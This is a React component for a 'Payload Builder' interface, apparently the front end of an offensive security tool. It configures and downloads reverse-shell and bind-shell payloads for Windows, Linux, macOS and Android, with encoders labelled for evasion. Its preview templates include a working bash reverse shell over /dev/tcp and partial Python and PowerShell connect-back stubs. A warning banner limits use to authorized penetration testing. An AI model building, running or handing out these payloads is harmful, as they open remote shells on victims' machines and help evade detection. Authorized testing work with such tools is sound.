import React, { useState } from 'react';
import { Database, Download, Code, Shield, Copy, Play, Settings, AlertTriangle } from 'lucide-react';

const PayloadBuilder = () => {
  const [payloadConfig, setPayloadConfig] = useState({
    os: 'windows',
    arch: 'x64',
    type: 'reverse_tcp',
    lhost: '192.168.1.100',
    lport: '4444',
    encoder: 'none',
    format: 'exe',
    iterations: 1
  });

  const [generatedPayload, setGeneratedPayload] = useState(null);
  const [payloadPreview, setPayloadPreview] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);

  const osOptions = [
    { value: 'windows', label: 'Windows', icon: '🪟' },
    { value: 'linux', label: 'Linux', icon: '🐧' },
    { value: 'macos', label: 'macOS', icon: '🍎' },
    { value: 'android', label: 'Android', icon: '🤖' }
  ];

  const archOptions = [
    { value: 'x86', label: 'x86 (32-bit)' },
    { value: 'x64', label: 'x64 (64-bit)' },
    { value: 'arm', label: 'ARM' },
    { value: 'arm64', label: 'ARM64' }
  ];

  const typeOptions = [
    { value: 'reverse_tcp', label: 'Reverse TCP', description: 'Connect back to attacker' },
    { value: 'reverse_http', label: 'Reverse HTTP', description: 'HTTP-based reverse connection' },
    { value: 'reverse_https', label: 'Reverse HTTPS', description: 'HTTPS-based reverse connection' },
    { value: 'bind_tcp', label: 'Bind TCP', description: 'Listen on target port' },
    { value: 'reverse_shell', label: 'Reverse Shell', description: 'Basic shell connection' }
  ];

  const encoderOptions = [
    { value: 'none', label: 'None', description: 'No encoding' },
    { value: 'base64', label: 'Base64', description: 'Base64 encoding' },
    { value: 'xor', label: 'XOR', description: 'XOR encoding with random key' },
    { value: 'rot13', label: 'ROT13', description: 'ROT13 text encoding' },
    { value: 'polymorphic', label: 'Polymorphic', description: 'Advanced polymorphic encoding' }
  ];

  const formatOptions = {
    windows: ['exe', 'dll', 'ps1', 'bat', 'vbs'],
    linux: ['elf', 'sh', 'py', 'pl'],
    macos: ['macho', 'sh', 'py'],
    android: ['apk', 'so']
  };

  const handleConfigChange = (key, value) => {
    setPayloadConfig(prev => ({
      ...prev,
      [key]: value
    }));
  };

  const generatePayload = async () => {
    setIsGenerating(true);
    
    try {
      // Call backend API to generate real payload
      const response = await fetch('/api/payloads/build', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          os: payloadConfig.os,
          arch: payloadConfig.arch,
          payload_type: payloadConfig.type,
          lhost: payloadConfig.lhost,
          lport: parseInt(payloadConfig.lport),
          encoder: payloadConfig.encoder,
          format: payloadConfig.format,
          iterations: payloadConfig.iterations
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        const realPayload = {
          id: Date.now(),
          config: { ...payloadConfig },
          size: result.size || result.payload.length / 2, // Hex string length / 2
          hash: await generateHash(result.payload),
          created: new Date().toISOString(),
          shellcode: result.payload,
          raw_payload: result.payload
        };
        
        setGeneratedPayload(realPayload);
        
        // Generate preview based on payload type
        const preview = generatePayloadPreview(realPayload);
        setPayloadPreview(preview);
      } else {
        console.error('Payload generation failed:', result.error);
        // Fallback to demo payload
        generateDemoPayload();
      }
    } catch (error) {
      console.error('Error generating payload:', error);
      // Fallback to demo payload
      generateDemoPayload();
    }
    
    setIsGenerating(false);
  };
  
  const generateDemoPayload = () => {
    const mockPayload = {
      id: Date.now(),
      config: { ...payloadConfig },
      size: Math.floor(Math.random() * 50000) + 10000,
      hash: 'demo_' + Math.random().toString(36).substring(7),
      created: new Date().toISOString(),
      shellcode: Array.from({ length: 32 }, () => Math.floor(Math.random() * 256).toString(16).padStart(2, '0')).join(' '),
      raw_payload: 'demo_payload_data'
    };
    
    setGeneratedPayload(mockPayload);
    setPayloadPreview(generatePayloadPreview(mockPayload));
  };
  
  const generateHash = async (data) => {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(data);
    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16);
  };
  
  const generatePayloadPreview = (payload) => {
    if (payload.config.format === 'py') {
      return `#!/usr/bin/env python3\n# Generated payload for ${payload.config.os}/${payload.config.arch}\n# Type: ${payload.config.type}\n\nimport socket\nimport subprocess\n\n# Payload configuration\nLHOST = "${payload.config.lhost}"\nLPORT = ${payload.config.lport}\n\n# Execute payload\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((LHOST, LPORT))\n    # Payload execution code here\nexcept Exception as e:\n    pass`;
    } else if (payload.config.format === 'ps1') {
      return `# PowerShell Payload\n# Target: ${payload.config.os}/${payload.config.arch}\n# Type: ${payload.config.type}\n\n$client = New-Object System.Net.Sockets.TCPClient("${payload.config.lhost}",${payload.config.lport})\n$stream = $client.GetStream()\n# Payload execution code here`;
    } else if (payload.config.format === 'sh') {
      return `#!/bin/bash\n# Shell payload for ${payload.config.os}/${payload.config.arch}\n# Type: ${payload.config.type}\n\nbash -i >& /dev/tcp/${payload.config.lhost}/${payload.config.lport} 0>&1`;
    } else {
      return payload.shellcode;
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  const downloadPayload = () => {
    if (!generatedPayload) return;
    
    const blob = new Blob([payloadPreview || generatedPayload.raw_payload], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payload_${generatedPayload.id}.${payloadConfig.format}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const testPayload = async () => {
    if (!generatedPayload) return;
    
    // In a real implementation, this would test the payload
    alert('Payload testing functionality would be implemented here');
  };

  return (
    <div className="p-6 space-y-6">
      {/* Header */}
      <div className="border-b border-gray-700 pb-4">
        <h1 className="text-2xl font-bold text-green-400">Payload Builder</h1>
        <p className="text-gray-400 mt-1">Generate custom payloads for different platforms and architectures</p>
      </div>

      {/* Warning Banner */}
      <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4">
        <div className="flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5 text-red-400" />
          <p className="text-red-400 text-sm"><strong>Warning:</strong> Generated payloads are for authorized penetration testing only. Ensure you have explicit permission before use.</p>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
        {/* Configuration Panel */}
        <div className="xl:col-span-2 space-y-6">
          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6">
            <div className="flex items-center space-x-2 mb-6">
              <Settings className="w-5 h-5 text-green-400" />
              <h2 className="text-lg font-semibold text-green-400">Payload Configuration</h2>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* Operating System */}
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-3">Operating System</label>
                <div className="grid grid-cols-2 gap-2">
                  {osOptions.map((os) => (
                    <button
                      key={os.value}
                      onClick={() => handleConfigChange('os', os.value)}
                      className={`p-3 rounded-lg border transition-all ${
                        payloadConfig.os === os.value
                          ? 'border-green-500 bg-green-500/20 text-green-400'
                          : 'border-gray-600 bg-gray-900 text-gray-300 hover:border-gray-500'
                      }`}
                    >
                      <div className="text-lg mb-1">{os.icon}</div>
                      <div className="text-sm font-medium">{os.label}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Architecture */}
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-3">Architecture</label>
                <select
                  value={payloadConfig.arch}
                  onChange={(e) => handleConfigChange('arch', e.target.value)}
                  className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none"
                >
                  {archOptions.map((arch) => (
                    <option key={arch.value} value={arch.value}>
                      {arch.label}
                    </option>
                  ))}
                </select>
              </div>

              {/* Payload Type */}
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-3">Payload Type</label>
                <select
                  value={payloadConfig.type}
                  onChange={(e) => handleConfigChange('type', e.target.value)}
                  className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none"
                >
                  {typeOptions.map((type) => (
                    <option key={type.value} value={type.value}>
                      {type.label} - {type.description}
                    </option>
                  ))}
                </select>
              </div>

              {/* Output Format */}
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-3">Output Format</label>
                <select
                  value={payloadConfig.format}
                  onChange={(e) => handleConfigChange('format', e.target.value)}
                  className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none"
                >
                  {formatOptions[payloadConfig.os]?.map((format) => (
                    <option key={format} value={format}>
                      .{format}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* Connection Settings */}
            <div className="mt-6 pt-6 border-t border-gray-700">
              <h3 className="text-md font-semibold text-gray-300 mb-4">Connection Settings</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">Local Host (LHOST)</label>
                  <input
                    type="text"
                    value={payloadConfig.lhost}
                    onChange={(e) => handleConfigChange('lhost', e.target.value)}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none font-mono"
                    placeholder="192.168.1.100"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">Local Port (LPORT)</label>
                  <input
                    type="text"
                    value={payloadConfig.lport}
                    onChange={(e) => handleConfigChange('lport', e.target.value)}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none font-mono"
                    placeholder="4444"
                  />
                </div>
              </div>
            </div>

            {/* Encoding Settings */}
            <div className="mt-6 pt-6 border-t border-gray-700">
              <h3 className="text-md font-semibold text-gray-300 mb-4">Encoding & Evasion</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">Encoder</label>
                  <select
                    value={payloadConfig.encoder}
                    onChange={(e) => handleConfigChange('encoder', e.target.value)}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none"
                  >
                    {encoderOptions.map((encoder) => (
                      <option key={encoder.value} value={encoder.value}>
                        {encoder.label} - {encoder.description}
                      </option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">Iterations</label>
                  <input
                    type="number"
                    value={payloadConfig.iterations}
                    onChange={(e) => handleConfigChange('iterations', parseInt(e.target.value))}
                    min="1"
                    max="10"
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-600 rounded-lg text-gray-300 focus:border-green-500 focus:outline-none"
                  />
                </div>
              </div>
            </div>

            {/* Generate Button */}
            <div className="mt-8">
              <button
                onClick={generatePayload}
                disabled={isGenerating}
                className="w-full flex items-center justify-center space-x-2 px-6 py-3 bg-green-500/20 text-green-400 border border-green-500/50 rounded-lg hover:bg-green-500/30 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isGenerating ? (
                  <>
                    <div className="w-5 h-5 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
                    <span>Generating Payload...</span>
                  </>
                ) : (
                  <>
                    <Database className="w-5 h-5" />
                    <span>Generate Payload</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Output Panel */}
        <div className="space-y-6">
          {/* Payload Preview */}
          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6">
            <div className="flex items-center space-x-2 mb-4">
              <Code className="w-5 h-5 text-blue-400" />
              <h2 className="text-lg font-semibold text-blue-400">Generated Payload</h2>
            </div>

            {generatedPayload ? (
              <div className="space-y-4">
                {/* Payload Info */}
                <div className="bg-gray-900 rounded-lg p-4 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Size:</span>
                    <span className="text-green-400 font-mono">{generatedPayload.size.toLocaleString()} bytes</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Hash:</span>
                    <span className="text-blue-400 font-mono">{generatedPayload.hash}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Created:</span>
                    <span className="text-gray-300">{new Date(generatedPayload.created).toLocaleTimeString()}</span>
                  </div>
                </div>

                {/* Shellcode Preview */}
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <label className="text-sm font-medium text-gray-400">Shellcode Preview:</label>
                    <button
                      onClick={() => copyToClipboard(payloadPreview || generatedPayload.shellcode)}
                      className="flex items-center space-x-1 px-2 py-1 text-xs bg-gray-700 text-gray-300 rounded hover:bg-gray-600 transition-colors"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copy</span>
                    </button>
                  </div>
                  <div className="bg-gray-900 rounded-lg p-3 font-mono text-xs text-green-400 overflow-x-auto">
                    {payloadPreview || generatedPayload.shellcode}
                  </div>
                </div>

                {/* Actions */}
                <div className="flex space-x-2">
                  <button
                    onClick={downloadPayload}
                    className="flex-1 flex items-center justify-center space-x-2 px-4 py-2 bg-blue-500/20 text-blue-400 border border-blue-500/50 rounded-lg hover:bg-blue-500/30 transition-colors"
                  >
                    <Download className="w-4 h-4" />
                    <span>Download</span>
                  </button>
                  <button onClick={testPayload} className="flex-1 flex items-center justify-center space-x-2 px-4 py-2 bg-green-500/20 text-green-400 border border-green-500/50 rounded-lg hover:bg-green-500/30 transition-colors">
                    <Play className="w-4 h-4" />
                    <span>Test</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="text-center py-8">
                <Database className="w-12 h-12 text-gray-600 mx-auto mb-4" />
                <p className="text-gray-500">No payload generated yet</p>
                <p className="text-gray-600 text-sm mt-1">Configure settings and click Generate</p>
              </div>
            )}
          </div>

          {/* Quick Templates */}
          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6">
            <div className="flex items-center space-x-2 mb-4">
              <Shield className="w-5 h-5 text-purple-400" />
              <h2 className="text-lg font-semibold text-purple-400">Quick Templates</h2>
            </div>

            <div className="space-y-2">
              {[
                { name: 'Windows Reverse Shell', config: { os: 'windows', type: 'reverse_tcp', arch: 'x64' } },
                { name: 'Linux Bind Shell', config: { os: 'linux', type: 'bind_tcp', arch: 'x64' } },
                { name: 'Android Reverse HTTP', config: { os: 'android', type: 'reverse_http', arch: 'arm' } },
                { name: 'macOS Encoded Shell', config: { os: 'macos', type: 'reverse_tcp', encoder: 'base64' } },
              ].map((template, index) => (
                <button
                  key={index}
                  onClick={() => setPayloadConfig(prev => ({ ...prev, ...template.config }))}
                  className="w-full text-left px-3 py-2 bg-gray-900 rounded-lg text-gray-300 hover:bg-gray-700 transition-colors text-sm"
                >
                  {template.name}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PayloadBuilder;